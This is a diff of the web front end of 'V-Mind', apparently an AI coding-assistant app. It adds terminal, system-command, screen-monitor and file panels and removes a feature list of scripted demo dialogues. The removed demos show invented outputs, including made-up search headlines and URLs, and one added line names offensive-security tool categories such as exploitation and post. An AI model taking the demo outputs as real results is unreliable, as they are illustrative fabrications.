+          <button onclick="runSysCmd('screenshot')" style="padding:3px 8px;background:var(--surface);border:1px solid var(--border);color:var(--text);border-radius:3px;cursor:pointer;font-size:10px;font-family:inherit">Screenshot</button>
+          <button onclick="runSysCmd('list_apps')" style="padding:3px 8px;background:var(--surface);border:1px solid var(--border);color:var(--text);border-radius:3px;cursor:pointer;font-size:10px;font-family:inherit">Apps</button>
+          <button onclick="runSysCmd('list_windows')" style="padding:3px 8px;background:var(--surface);border:1px solid var(--border);color:var(--text);border-radius:3px;cursor:pointer;font-size:10px;font-family:inherit">Windows</button>
+          <button onclick="runSysCmd('battery')" style="padding:3px 8px;background:var(--surface);border:1px solid var(--border);color:var(--text);border-radius:3px;cursor:pointer;font-size:10px;font-family:inherit">Battery</button>
+        </div>
+        <div id="sys-output" style="flex:1;overflow:auto;padding:8px;font-size:11px;white-space:pre-wrap;color:var(--dim)">Click a button to query system info.</div>
+        <div style="padding:6px 8px;display:flex;gap:4px;border-top:1px solid var(--border)"><input id="sys-input" type="text" placeholder="Type a command..." style="flex:1;background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:4px 6px;color:var(--text);font-size:11px;font-family:inherit;outline:none" onkeydown="if(event.key==='Enter')runSysCmdCustom()"><button onclick="runSysCmdCustom()" style="padding:4px 10px;background:var(--accent);color:#000;border:none;border-radius:3px;font-weight:600;cursor:pointer;font-size:10px;font-family:inherit">Run</button></div>
+      </div>
+      <div id="rtab-events" class="rtab">
+        <div style="padding:6px 8px;display:flex;gap:4px;align-items:center;border-bottom:1px solid var(--border)"><span style="font-size:11px;color:var(--dim);font-weight:500">Live System Events</span><span id="events-count" style="font-size:10px;color:var(--dim);margin-left:auto">0 events</span><button onclick="clearEvents()" style="padding:2px 8px;background:transparent;border:1px solid var(--border);color:var(--dim);border-radius:3px;cursor:pointer;font-size:10px;font-family:inherit">Clear</button></div>
+        <div id="events-output" style="flex:1;overflow:auto;padding:4px 0;font-size:11px"></div>
+      </div>
+      <div id="rtab-monitor" class="rtab">
+        <div style="padding:6px 8px;display:flex;gap:4px;align-items:center;border-bottom:1px solid var(--border)"><button id="monitor-btn" onclick="toggleMonitor()" style="padding:4px 12px;background:var(--green);color:#000;border:none;border-radius:4px;font-weight:600;cursor:pointer;font-size:11px;font-family:inherit">Start Monitor</button><span id="monitor-status" style="font-size:10px;color:var(--dim)">Stopped</span><span id="monitor-count" style="font-size:10px;color:var(--dim);margin-left:auto">0 captures</span></div>
+        <div id="monitor-output" style="flex:1;overflow:auto;padding:8px;font-size:11px;white-space:pre-wrap;color:var(--dim)">Click Start to begin monitoring your screen.</div>
+        <div id="monitor-error" style="padding:4px 8px;font-size:10px;color:var(--red);display:none"></div>
+      </div>
+      <div id="rtab-project" class="rtab">
+        <div style="padding:6px 8px;display:flex;flex-direction:column;gap:6px;height:100%">
+          <div style="display:flex;gap:4px;align-items:center"><span style="font-size:11px;color:var(--dim)">Describe the project to build:</span></div>
+          <textarea id="project-input" placeholder="e.g. A Flask blog with SQLite, user auth, REST API..." style="flex:1;resize:none;background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:8px;color:var(--text);font-size:12px;font-family:inherit;outline:none;min-height:60px"></textarea>
+          <div style="display:flex;gap:4px"><input id="project-dir" type="text" placeholder="Target directory" style="flex:1;background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:4px 6px;color:var(--text);font-size:11px;font-family:inherit;outline:none"><button onclick="generateProject()" style="padding:6px 16px;background:var(--accent);color:#000;border:none;border-radius:4px;font-weight:600;cursor:pointer;font-size:11px;font-family:inherit">Generate</button></div>
+          <div id="project-output" style="flex:1;overflow:auto;padding:8px;font-size:11px;white-space:pre-wrap;color:var(--dim);border:1px solid var(--border);border-radius:4px;background:var(--bg)">Describe your project above and click Generate.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- FILES PANEL -->
+    <div id="panel-files">
+      <div class="panel-bg" id="bg-files"></div>
+      <div style="padding:4px 6px;border-bottom:1px solid var(--border);display:flex;flex-direction:column;gap:3px">
+        <div style="display:flex;gap:4px;align-items:center"><input id="file-path-input" type="text" style="flex:1;background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:3px 6px;color:var(--text);font-size:10px;font-family:inherit;outline:none" onkeydown="if(event.key==='Enter')loadFileTree(this.value)"><button onclick="loadFileTree(document.getElementById('file-path-input').value)" style="padding:3px 8px;background:var(--accent);color:#000;border:none;border-radius:3px;cursor:pointer;font-size:10px;font-family:inherit;font-weight:600">Go</button></div>
+        <button onclick="openFolder()" style="padding:3px 10px;background:var(--accent);color:#000;border:none;border-radius:3px;cursor:pointer;font-size:11px;font-family:inherit;font-weight:600">+ Open Folder</button>
+        <input type="file" id="folder-picker" webkitdirectory style="display:none" onchange="onFolderPicked(this.files)">
+      </div>
+      <div id="file-tree" style="flex:1;overflow-y:auto;padding:2px 0"></div>
     </div>
   </div>
 </div>
 
+<!-- TERMINAL -->
+<div id="terminal">
+  <div class="t-out" id="t-out"></div>
+  <div class="t-input-row"><span class="t-prompt">$</span><input id="t-input" type="text" placeholder="Type a command..." onkeydown="if(event.key==='Enter')sendCommand()"></div>
+</div>
+
 <script>
-const features = [
-  // 0-4: AI Core
-  { icon:'&#129302;', title:'Multi-Backend LLM',
-    desc:'V-Mind auto-detects a running Ollama instance for local inference, or falls back to OpenRouter for cloud models. You can explicitly set the backend to auto, local, or remote.',
-    caps:['Ollama auto-detection','OpenRouter cloud API','Explicit auto/local/remote switch','API key via V_MIND_API_KEY env'],
-    demo:'<span class="prompt">You:</span> what backend are you using?\n<span class="prompt">V-Mind:</span> <span class="highlight">Backend: auto (Ollama detected)</span>\n<span class="output">Ollama running at http://127.0.0.1:11434</span>\n<span class="output">Available models: tinyllama, qwen2.5:7b</span>\n<span class="output">Using: tinyllama (1.1B) locally</span>\n<span class="output">Speed: ~24 tok/s on CPU. No internet needed.</span><span class="cursor"></span>' },
-  { icon:'&#128172;', title:'Multi-Turn Chat',
-    desc:'Full conversational AI with history. Streaming token-by-token responses. Configurable context window (default 12 turns). Automatically trims old history to fit.',
-    caps:['Token-by-token streaming','12-turn default context','Auto-trim history','Session persistence'],
-    demo:'<span class="prompt">You:</span> what was my last question about?\n<span class="prompt">V-Mind:</span> You asked about the <span class="highlight">multi-backend LLM system</span>. I explained that V-Mind auto-detects Ollama for local inference or falls back to OpenRouter for cloud models.\n<span class="output">Your session has 8 messages of history preserved.</span><span class="cursor"></span>' },
-  { icon:'&#9889;', title:'Vibe & Spec Modes',
-    desc:'Switch between two interaction modes. Vibe Mode: free-form conversational genius. Spec Mode: plan-then-execute with explicit analysis, step-by-step planning, execution, and review.',
-    caps:['Vibe Mode — free-form chat','Spec Mode — plan-then-execute','Visual mode badge in UI','Different behavior per mode'],
-    demo:'<span class="prompt">You:</span> build me a CLI todo app (Spec Mode)\n<span class="prompt">V-Mind:</span> <span class="highlight">Analysis:</span> Need a Python CLI with add/list/done/delete commands, JSON file storage.\n<span class="output">Plan:\n1. Create project structure\n2. Implement storage layer\n3. Implement CLI commands\n4. Add main entry point\n5. Test</span>\n<span class="prompt">Executing step 1...</span><span class="cursor"></span>' },
-  { icon:'&#128214;', title:'Tool-Calling Loop',
-    desc:'The agent can call tools, get results, and continue reasoning. Up to 25 execution turns. Uses the think tool for chain-of-thought reasoning before acting.',
-    caps:['25-turn execution loop','Chain-of-thought reasoning','Tool result feedback','Multi-step autonomous tasks'],
-    demo:'<span class="prompt">You:</span> find all TODO comments in my project\n<span class="prompt">V-Mind:</span> [Running grep for TODO...]\n<span class="output">web_app.py: <span class="highlight"># TODO: add rate limiting</span></span>\n<span class="output">agent.py: <span class="highlight"># TODO: optimize context window</span></span>\n<span class="output">(thought) I found 2 TODOs. Should I fix them?</span>\n<span class="prompt">V-Mind:</span> Found 2 TODO comments. Want me to fix them?<span class="cursor"></span>' },
-  { icon:'&#127912;', title:'Session Management',
-    desc:'Create, rename, switch, and delete multiple chat sessions. Each session has independent history and is persisted in browser localStorage.',
-    caps:['Create/rename/delete sessions','Switch between sessions','Independent history','localStorage persistence'],
-    demo:'<span class="prompt">[Switched to session: Project Alpha]</span>\n<span class="prompt">You:</span> continue where we left off\n<span class="prompt">V-Mind:</span> Welcome back! You were working on the <span class="highlight">authentication module</span>. We had just fixed the JWT token refresh logic.\n<span class="output">Your session has 15 previous messages.</span><span class="cursor"></span>' },
+const CATS={recon:5,scanning:4,exploitation:4,post:4,web:3,network:6}
+const BG_IMAGES=[]
+const BG_PANELS=['bg-chat','bg-review','bg-files']
 
-  // 5-8: Models
-  { icon:'&#128187;', title:'Ollama Models',
-    desc:'Runs any Ollama-pulled model locally. TinyLlama, Qwen 2.5, CodeLlama, Mistral, Llama 3.x, Gemma 4, and more. No internet required after setup.',
-    caps:['Any Ollama model','TinyLlama, Qwen, CodeLlama','Mistral, Llama 3.x, Gemma 4','Fully offline operation'],
-    demo:'<span class="prompt">You:</span> which models do you have?\n<span class="prompt">V-Mind:</span> <span class="highlight">Available local models:</span>\n<span class="output">tinyllama     (1.1B)  active</span>\n<span class="output">codellama     (7B)   not loaded</span>\n<span class="output">mistral       (7B)   not loaded</span>\n<span class="output">Run <span class="highlight">ollama pull &lt;model&gt;</span> to add more.</span><span class="cursor"></span>' },
-  { icon:'&#9729;&#65039;', title:'Cloud Models',
-    desc:'Accesses dozens of cloud LLMs via OpenRouter and OpenAI-compatible APIs. GPT-4o, Claude 3.5 Sonnet, Llama 3.3 70B, and many more.',
-    caps:['GPT-4o / GPT-4.1','Claude 3.5 Sonnet','Llama 3.3 70B','OpenRouter & OpenAI APIs'],
-    demo:'<span class="prompt">You:</span> switch to GPT-4o\n<span class="prompt">V-Mind:</span> Switched to <span class="highlight">GPT-4o</span>\n<span class="output">Backend: remote (OpenRouter)</span>\n<span class="output">Model: openai/gpt-4o</span>\n<span class="output">Ready. Your messages will now be processed by GPT-4o.</span><span class="cursor"></span>' },
-  { icon:'&#127937;', title:'Free Models',
-    desc:'Access free LLMs via OpenRouter: Cohere North Mini Code, GPT-OSS 120B, Gemma 4 26B/31B, Hermes 3 405B. No API key required for free tier.',
-    caps:['Cohere North Mini Code','GPT-OSS 120B (free)','Gemma 4 26B/31B (free)','Hermes 3 405B (free)'],
-    demo:'<span class="prompt">You:</span> use a free model\n<span class="prompt">V-Mind:</span> <span class="highlight">Free models available:</span>\n<span class="output">1. cohere/north-mini-code</span>\n<span class="output">2. openrouter/gpt-oss-120b</span>\n<span class="output">3. google/gemma-4-26b</span>\n<span class="output">4. nousresearch/hermes-3-405b</span>\n<span class="output">Which one? All are free via OpenRouter.</span><span class="cursor"></span>' },
-  { icon:'&#127919;', title:'Configurable',
-    desc:'Change models anytime from settings. Adjust temperature (0-1). The backend auto-detects Ollama or falls back to cloud. Status panel shows active config.',
-    caps:['Switch models anytime','Temperature control (0-1)','Auto Ollama detection','Status panel'],
+let sid=localStorage.getItem('vms')||crypto.randomUUID()
+localStorage.setItem('vms',sid)
+let loading=false,sidebarVisible=true,pendingFiles=[],currentMode=localStorage.getItem('vmmode')||'vibe',currentFile=null
+let sessions=JSON.parse(localStorage.getItem('vmsess')||'[{"id":"default","name":"General"}]')
+let activeSession='default'
+let speechMuted=localStorage.getItem('vmspeech')==='muted'
+let recognition=null,isRecording=false,utterance=null,monitorPoll=null,eventsPoll=null
+let gsCurrentTab='text',gsLastQuery='',gsSuggestTimer=null
+let brHistory=[],brIdx=-1,brSearchContent=''
+let libBooks=[],libReaderActive=false
+let notifiedEvents=new Set()
+let backendUrl=localStorage.getItem('vmBackendUrl')||'http://127.0.0.1:8765'
+let apiKey=localStorage.getItem('vmApiKey')||'',apiProvider=localStorage.getItem('vmApiProvider')||'openai'
+let appMode=localStorage.getItem('vmAppMode')||'backend'
 
-    demo:'<span class="prompt">You:</span> show me your config\n<span class="prompt">V-Mind:</span> <span class="highlight">Current Configuration:</span>\n<span class="output">Backend: auto (Ollama detected)</span>\n<span class="output">Model: tinyllama (1.1B)</span>\n<span class="output">Temperature: 0.3</span>\n<span class="output">Mode: Vibe</span>\n<span class="output">Session turns: 4/12</span><span class="cursor"></span>' },
-
-  // 9-13: File Ops
-  { icon:'&#128196;', title:'Read / Write / Edit',
-    desc:'Read files with line numbers. Write content with auto-created parent directories. Targeted text replacement edits without rewriting the whole file.',
-    caps:['Line-numbered file read','Write with auto-create dirs','Targeted text replacement','Safe edit operations'],
-    demo:'<span class="prompt">You:</span> fix the typo in readme.md\n<span class="prompt">V-Mind:</span> Reading <span class="highlight">readme.md</span>...\n<span class="output">Line 12: "V-Mind is a super-inteligent AI"</span>\n<span class="prompt">V-Mind:</span> Fixing typo: <span class="highlight">inteligent &#8594; intelligent</span>\n<span class="output">Done! File updated.</span><span class="cursor"></span>' },
-  { icon:'&#128269;', title:'Glob & List Dir',
-    desc:'Wildcard file search patterns like **/*.py. Directory listings with file sizes, types, and modification info.',
-    caps:['Wildcard glob patterns','Detailed directory listing','File sizes & types','Recursive search'],
-    demo:'<span class="prompt">You:</span> list all python files\n<span class="prompt">V-Mind:</span> <span class="highlight">Found 14 .py files:</span>\n<span class="output">v_mind/agent.py          (12.4 KB)</span>\n<span class="output">v_mind/cli.py            (3.2 KB)</span>\n<span class="output">v_mind/config.py         (1.8 KB)</span>\n<span class="output">v_mind/web_app.py        (45.6 KB)</span>\n<span class="output">...</span><span class="cursor"></span>' },
-  { icon:'&#128196;', title:'Multi-Format Reader',
-    desc:'Extracts text from PDFs (PyPDF2), Word docs (python-docx), Excel sheets (openpyxl), CSVs (formatted tables), and plain text files.',
-    caps:['PDF text extraction','Word docx reader','Excel xlsx reader','CSV table formatter'],
-    demo:'<span class="prompt">You:</span> read the report.pdf\n<span class="prompt">V-Mind:</span> Extracting <span class="highlight">report.pdf</span>...\n<span class="output">Title: Q4 Performance Summary</span>\n<span class="output">Pages: 12</span>\n<span class="output">---</span>\n<span class="output">Revenue grew 23% YoY... operating costs reduced by 15%...</span>\n<span class="output">[Content extracted successfully]</span><span class="cursor"></span>' },
-  { icon:'&#128230;', title:'File Upload',
-    desc:'Upload 30+ file types via browser. Images sent as base64 for vision analysis. Max 500MB per file. Text/code files get content preview sent to AI.',
-    caps:['30+ file types supported','500MB max per file','Vision analysis for images','Auto text preview for AI'],
-    demo:'<span class="prompt">You:</span> analyze this screenshot\n<span class="prompt">V-Mind:</span> [File uploaded: <span class="highlight">screenshot.png</span> (2.4 MB)]\n<span class="output">Analyzing image contents...</span>\n<span class="output">I can see a VS Code window with a Python file open.</span>\n<span class="output">The code shows a Flask route for user authentication.</span>\n<span class="output">There appears to be a bug on line 34...</span><span class="cursor"></span>' },
-  { icon:'&#128190;', title:'Delete & Manage',
-    desc:'Delete files or empty directories. Full file tree browser with expandable/collapsible folders. Navigate and open files directly from the tree.',
-    caps:['Delete files/dirs','File tree explorer','Expand/collapse folders','Open files from tree'],
-    demo:'<span class="prompt">You:</span> show me the project structure\n<span class="prompt">V-Mind:</span> <span class="highlight">Project Tree:</span>\n<span class="output">&#128193; v-mind-ai/</span>\n<span class="output">  &#128193; v_mind/</span>\n<span class="output">    &#128196; agent.py</span>\n<span class="output">    &#128196; cli.py</span>\n<span class="output">    &#128193; tools/ (16 files)</span>\n<span class="output">    &#128193; static/</span>\n<span class="output">  &#128196; index.html</span><span class="cursor"></span>' },
-
-  // 14-16: Shell
-  { icon:'&#128421;&#65039;', title:'Run Any Command',
-    desc:'Execute shell commands with configurable timeout. Async subprocess execution with stdout/stderr capture.',
-    caps:['Arbitrary command execution','Configurable timeout','Async subprocess','stdout/stderr capture'],
-    demo:'<span class="prompt">You:</span> check disk space\n<span class="prompt">V-Mind:</span> Running <span class="highlight">df -h</span>...\n<span class="output">Filesystem     Size  Used Avail Use%</span>\n<span class="output">C:\\             512G  234G   278G  45%</span>\n<span class="output">D:\\             1.0T  456G   544G  42%</span><span class="cursor"></span>' },
-  { icon:'&#128187;', title:'Built-in Terminal',
-    desc:'Collapsible in-browser terminal panel. Sends commands to /api/exec with real-time stdout/stderr output and return code display.',
-    caps:['In-browser terminal','Real-time output','Return code display','Collapsible panel'],
-    demo:'<span class="prompt">$ python --version</span>\n<span class="output">Python 3.12.2</span>\n<span class="prompt">$ pip list | grep flask</span>\n<span class="output">Flask           3.0.0</span>\n<span class="prompt">$ </span><span class="cursor"></span>' },
-  { icon:'&#9201;&#65039;', title:'Long-Running Tasks',
-    desc:'Run background or long-running shell commands without blocking the chat. Output capped at 30KB to prevent flooding.',
-    caps:['Background execution','Non-blocking chat','30KB output cap','Timeout protection'],
-    demo:'<span class="prompt">You:</span> run npm install\n<span class="prompt">V-Mind:</span> Running <span class="highlight">npm install</span> (timeout: 60s)...\n<span class="output">added 1,234 packages in 45s</span>\n<span class="output">&#9989; 6 vulnerabilities (5 moderate, 1 high)</span>\n<span class="output">Run <span class="highlight">npm audit fix</span> to fix them.</span><span class="cursor"></span>' },
-
-  // 17-21: Web
-  { icon:'&#128269;', title:'Web Search',
-    desc:'DuckDuckGo search returning titles, URLs, and snippets. Supports text, images, videos, and news search types.',
-    caps:['DuckDuckGo search','Text/images/videos/news','Title + URL + snippet','Multi-result display'],
-    demo:'<span class="prompt">You:</span> search for quantum computing breakthroughs\n<span class="prompt">V-Mind:</span> <span class="highlight">Search results:</span>\n<span class="output">1. Google Willow chip achieves 10x error reduction</span>\n<span class="output">   https://blog.google/quantum-willow-2026</span>\n<span class="output">2. IBM releases Qiskit 2.0 with live quantum cloud</span>\n<span class="output">   https://ibm.com/quantum/qiskit-2</span>\n<span class="output">3. MIT demonstrates room-temperature quantum memory</span><span class="cursor"></span>' },
-  { icon:'&#128279;', title:'Fetch Pages',
-    desc:'Fetches any URL, strips HTML/JS/CSS, returns clean readable text. Up to 8000 characters per fetch.',
-    caps:['Universal URL fetching','HTML/JS/CSS stripping','8000 char limit','Clean text output'],
-    demo:'<span class="prompt">You:</span> summarize https://example.com\n<span class="prompt">V-Mind:</span> Fetching <span class="highlight">example.com</span>...\n<span class="output">[Content extracted: 2,341 characters]</span>\n<span class="output">---</span>\n<span class="output">Example Domain. This domain is for use in illustrative examples in documents. You may use this domain in literature without prior coordination.</span><span class="cursor"></span>' },
-  { icon:'&#127760;', title:'Wikipedia',
-    desc:'Query Wikipedia page summaries with title, description, text extract, thumbnail image, and full URL.',
-    caps:['Page summary lookup','Title & description','Text extract','Thumbnail & URL'],
-    demo:'<span class="prompt">You:</span> what is reinforcement learning?\n<span class="prompt">V-Mind:</span> <span class="highlight">Reinforcement Learning</span>\n<span class="output">From Wikipedia:</span>\n<span class="output">Reinforcement learning (RL) is an area of machine learning concerned with how intelligent agents ought to take actions in an environment to maximize cumulative reward.</span>\n<span class="output">&#128279; https://en.wikipedia.org/wiki/Reinforcement_learning</span><span class="cursor"></span>' },
-  { icon:'&#128228;', title:'Search Suggestions',
-    desc:'DuckDuckGo autocomplete suggestions for search-as-you-type functionality. Returns real-time query completions.',
-    caps:['Autocomplete suggestions','Real-time queries','DuckDuckGo API','Search-as-you-type'],
-    demo:'<span class="prompt">[Typing: "how to pyt"]</span>\n<span class="output">&#9654; how to python</span>\n<span class="output">&#9654; how to pytorch</span>\n<span class="output">&#9654; how to python programming</span>\n<span class="output">&#9654; how to pytorch tutorial</span><span class="cursor"></span>' },
-  { icon:'&#127917;', title:'In-App Browser',
-    desc:'Built-in iframe-based web browser. Back/forward navigation, URL bar, refresh. Text-rendering fallback for pages that block iframes.',
-    caps:['Iframe browser','Back/forward nav','URL bar','Text fallback mode'],
-    demo:'<span class="prompt">You:</span> open google.com in the browser\n<span class="prompt">V-Mind:</span> [Opening built-in browser...]\n<span class="output">&#128279; https://www.google.com</span>\n<span class="output">[Browser panel opened with navigation controls]</span><span class="cursor"></span>' },
-
-  // 22-27: Git
-  { icon:'&#128200;', title:'Status & Diff',
-    desc:'View working tree status (changed, staged, untracked). Show diffs of unstaged or staged changes, optionally filtered by file path.',
-    caps:['Working tree status','Staged/unstaged diff','File-path filtering','Branch info display'],
-    demo:'<span class="prompt">You:</span> git status\n<span class="prompt">V-Mind:</span> <span class="highlight">On branch main</span>\n<span class="output">Changes not staged:</span>\n<span class="output">  modified: index.html</span>\n<span class="output">  modified: v_mind/agent.py</span>\n<span class="output">Untracked: new_feature.py</span><span class="cursor"></span>' },
-  { icon:'&#128214;', title:'Commit & Log',
-    desc:'Commit staged changes with a message. Supports auto-add of tracked files. View recent commit history with oneline, graph, and decorate formatting.',
-    caps:['Commit with message','Auto-add tracked','Recent history view','Graph + decorate'],
-    demo:'<span class="prompt">You:</span> commit "fix: resolve race condition"\n<span class="prompt">V-Mind:</span> <span class="highlight">[main 3a1f2b4] fix: resolve race condition</span>\n<span class="output">2 files changed, 14 insertions(+), 3 deletions(-)</span>\n<span class="output">&#9989; Commit successful. 3 commits ahead of origin.</span><span class="cursor"></span>' },
-  { icon:'&#128279;', title:'Push / Pull / Clone',
-    desc:'Push to remote, pull from remote, clone repositories. Configurable git user name, email, and authentication tokens.',
-    caps:['Push to remote','Pull from remote','Clone repos','Auth token config'],
-    demo:'<span class="prompt">You:</span> push to origin\n<span class="prompt">V-Mind:</span> Pushing to <span class="highlight">origin/main</span>...\n<span class="output">To https://github.com/user/repo.git</span>\n<span class="output">   3a1f2b4..b7e8f9a  main -> main</span>\n<span class="output">&#9989; Push successful. Remote is up to date.</span><span class="cursor"></span>' },
-  { icon:'&#128736;&#65039;', title:'Branch Management',
-    desc:'List, create, delete, and switch branches. Show current branch. Diff any commit range for code review.',
-    caps:['List/create/delete branches','Switch branches','Current branch display','Commit range diff'],
-    demo:'<span class="prompt">You:</span> create a feature branch\n<span class="prompt">V-Mind:</span> <span class="highlight">Branch management:</span>\n<span class="output">Current: main</span>\n<span class="output">Creating: feat/voice-control</span>\n<span class="output">Switched to branch feat/voice-control</span><span class="cursor"></span>' },
-  { icon:'&#129302;', title:'Auto-Commit & PR',
-    desc:'AI-generated commit messages via GPT-4o-mini. Creates GitHub pull requests via the gh CLI with title and body.',
-    caps:['AI commit messages','GPT-4o-mini generated','GitHub PR via gh CLI','PR title + body'],
-    demo:'<span class="prompt">You:</span> auto-commit changes\n<span class="prompt">V-Mind:</span> Analyzing changes...\n<span class="output">[Generating commit message via AI...]</span>\n<span class="prompt">V-Mind:</span> <span class="highlight">"refactor: optimize database queries and add connection pooling"</span>\n<span class="output">&#9989; Committed! Create a PR? (y/n)</span><span class="cursor"></span>' },
-  { icon:'&#128194;', title:'Mini Git UI',
-    desc:'Inline chat panel showing branch, changed files with status indicators, diff viewer with syntax coloring, commit input, log viewer, push/pull buttons.',
-    caps:['Inline Git panel','Status indicators','Diff viewer','Push/pull/commit UI'],
-    demo:'<span class="prompt">[Git Panel opened]</span>\n<span class="output">&#128200; main | &#8593; 2 | &#128194; 3 changed</span>\n<span class="output">index.html        M  (12 lines)</span>\n<span class="output">agent.py          M  (8 lines)</span>\n<span class="output">new_feature.py    ?  (45 lines)</span>\n<span class="output">[Commit] [Push] [Pull] [Branch]</span><span class="cursor"></span>' },
-
-  // 28-32: Code Intelligence
-  { icon:'&#127919;', title:'Project Indexing',
-    desc:'Index codebases for semantic search. Auto-detects project type: Node.js, Python, Rust, Go, Java, Ruby, PHP, Static HTML, C/C++. Extracts dependencies.',
-    caps:['Full project indexing','Auto-detect project type','Dependency extraction','Embedding generation'],
-    demo:'<span class="prompt">You:</span> index this project\n<span class="prompt">V-Mind:</span> Indexing <span class="highlight">v-mind-ai</span>...\n<span class="output">Detected: Python project</span>\n<span class="output">Files: 124 | Chunks: 847</span>\n<span class="output">Dependencies: fastapi, uvicorn, jinja2, httpx</span>\n<span class="output">&#9989; Project indexed. Ready for semantic search.</span><span class="cursor"></span>' },
-  { icon:'&#128269;', title:'Semantic Code Search',
-    desc:'Find relevant code by meaning, not just keywords. Uses text-embedding-3-small for embeddings and cosine similarity for ranking.',
-    caps:['Meaning-based search','Embedding similarity','Ranked results','Cross-file search'],
-    demo:'<span class="prompt">You:</span> find the code that handles file uploads\n<span class="prompt">V-Mind:</span> <span class="highlight">Semantic search results:</span>\n<span class="output">1. web_app.py:1024 — upload_file()</span>\n<span class="output">   "Handles file upload with validation and preview"</span>\n<span class="output">2. web_app.py:1100 — upload_to_folder()</span>\n<span class="output">3. tools/files.py:45 — write()</span><span class="cursor"></span>' },
-  { icon:'#', title:'Regex Grep',
-    desc:'Fast ripgrep-based regex search across files with optional file-glob filter. Returns file paths, line numbers, and matching lines.',
-    caps:['Ripgrep integration','Regex pattern search','File-glob filtering','Line-numbered output'],
-    demo:'<span class="prompt">You:</span> grep for "TODO|FIXME"\n<span class="prompt">V-Mind:</span> <span class="highlight">Search results:</span>\n<span class="output">v_mind/agent.py:47     # TODO: optimize context window</span>\n<span class="output">v_mind/web_app.py:312  # FIXME: memory leak</span>\n<span class="output">v_mind/tools/bash.py:89 # TODO: add timeout config</span><span class="cursor"></span>' },
-  { icon:'&#128200;', title:'Codebase Stats',
-    desc:'Shows file count, chunk count, file extension breakdown. Lists detected languages and frameworks.',
-    caps:['File/extension stats','Chunk count','Language detection','Framework detection'],
-    demo:'<span class="prompt">You:</span> codebase stats\n<span class="prompt">V-Mind:</span> <span class="highlight">Codebase Statistics:</span>\n<span class="output">Total files: 124</span>\n<span class="output">Indexed chunks: 847</span>\n<span class="output">Extensions:</span>\n<span class="output">  .py   78 | .html  12 | .css  8</span>\n<span class="output">  .js   14 | .json  6 | .md   6</span><span class="cursor"></span>' },
-  { icon:'&#128240;', title:'Code Viewer',
-    desc:'Line-numbered code display with syntax highlighting. Open any file from the file tree and view its contents with proper formatting.',
-    caps:['Syntax highlighting','Line numbers','File tree integration','Read-only viewer'],
-    demo:'<span class="prompt">[Opened: v_mind/agent.py]</span>\n<span class="output"> 1  import os</span>\n<span class="output"> 2  import httpx</span>\n<span class="output"> 3  from typing import Optional</span>\n<span class="output"> 4  </span>\n<span class="output"> 5  class Agent:</span>\n<span class="output"> 6      def __init__(self):</span>
-<span class="output"> 7          self.backend = self._detect_backend()</span><span class="cursor"></span>' },
-
-  // 33-36: Auto-Fix
-  { icon:'&#128220;', title:'Run Linters',
-    desc:'Auto-detects available linters: ruff, flake8, pylint (Python), eslint (JS/TS), tsc (TypeScript), mypy, black, prettier.',
-    caps:['Auto-detect linters','ruff / flake8 / pylint','eslint / tsc / mypy','black / prettier'],
-    demo:'<span class="prompt">You:</span> lint my code\n<span class="prompt">V-Mind:</span> Running linters...\n<span class="output">ruff: 3 issues found</span>\n<span class="output">  E402: module import not at top (web_app.py:45)</span>\n<span class="output">  F841: local variable assigned but unused (agent.py:102)</span><span class="cursor"></span>' },
-  { icon:'&#128270;', title:'Run Tests',
-    desc:'Auto-detects and runs test frameworks: pytest (Python), jest/vitest (JS/TS), go test (Go). Returns outcomes and error details.',
-    caps:['pytest runner','jest/vitest runner','go test runner','Auto-detect framework'],
-    demo:'<span class="prompt">You:</span> run tests\n<span class="prompt">V-Mind:</span> Running <span class="highlight">pytest</span>...\n<span class="output">=============================</span>\n<span class="output">tests/test_agent.py .......&#9989;</span>\n<span class="output">tests/test_tools.py ...F...&#10060;</span>\n<span class="output">------------------------------</span>\n<span class="output">12 passed, 1 failed in 3.2s</span><span class="cursor"></span>' },
-  { icon:'&#128295;', title:'Auto-Fix Issues',
-    desc:'Auto-fixes lint and formatting issues using ruff --fix, black, and prettier. Non-destructive, only fixes what can be safely corrected.',
-    caps:['ruff --fix auto-fix','black formatting','prettier formatting','Safe non-destructive'],
-    demo:'<span class="prompt">You:</span> fix all lint issues\n<span class="prompt">V-Mind:</span> Auto-fixing with <span class="highlight">ruff --fix</span>...\n<span class="output">Fixed: 2 issues</span>\n<span class="output">  E402: moved import to top</span>\n<span class="output">  F841: removed unused variable</span>\n<span class="output">1 warning remains (requires manual review)</span><span class="cursor"></span>' },
-  { icon:'&#9889;', title:'Auto-Fix Loop',
-    desc:'The crown jewel: runs lint &#8594; fix &#8594; test loop iteratively until everything is clean. Fully automated self-healing for your codebase.',
-    caps:['Iterative fix loop','Lint &#8594; Fix &#8594; Test','Self-healing','Repeat until clean'],
-    demo:'<span class="prompt">You:</span> start auto-fix loop\n<span class="prompt">V-Mind:</span> <span class="highlight">Auto-Fix Loop initiated</span>\n<span class="output">Round 1: lint (3) &#8594; fix (2) &#8594; test (1 failed)</span>\n<span class="output">Round 2: lint (0) &#8594; fix (0) &#8594; test (passed)</span>\n<span class="highlight">&#9989; Codebase is clean after 2 rounds!</span><span class="cursor"></span>' },
-
-  // 37-39: Planner
-  { icon:'&#128195;', title:'Create Plans',
-    desc:'Break complex goals into step-by-step execution plans. AI generates tasks with dependencies, descriptions, and estimated order.',
-    caps:['AI-generated plans','Step-by-step tasks','Dependency tracking','Structured execution'],
-    demo:'<span class="prompt">You:</span> plan a REST API\n<span class="prompt">V-Mind:</span> <span class="highlight">Plan: Build REST API</span>\n<span class="output">1. Project setup (dependencies: none)</span>\n<span class="output">2. Database models (deps: 1)</span>\n<span class="output">3. Auth endpoints (deps: 2)</span>\n<span class="output">4. CRUD endpoints (deps: 3)</span>\n<span class="output">5. Tests (deps: 4)</span>\n<span class="output">Start with step 1?</span><span class="cursor"></span>' },
-  { icon:'&#128203;', title:'Track Progress',
-    desc:'List all saved plans with completion percentages. Show task status: pending, running, done, or failed. Update task status with optional results.',
-    caps:['Plan list with progress','Task status tracking','Status updates','Result logging'],
